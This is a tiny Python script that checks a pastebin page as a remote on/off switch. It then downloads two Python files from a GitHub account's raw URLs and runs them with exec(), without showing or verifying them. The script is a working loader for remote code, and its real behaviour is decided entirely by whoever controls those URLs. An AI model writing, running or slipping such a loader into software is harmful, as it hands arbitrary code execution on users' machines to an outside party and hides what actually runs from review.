import requests,json

__check__ = requests.get('https://pastebin.com/raw/ji4T6sYx').text
if "on" in __check__:
  input("Sever Online\nPress Enter to continue...")
else:
  exit("Sever Offline")
exec(requests.get('https://raw.githubusercontent.com/huykazuto1/ndha/main/shorterlink.py').text)
exec(requests.get('https://raw.githubusercontent.com/huykazuto1/ndha/main/zf.py').text)

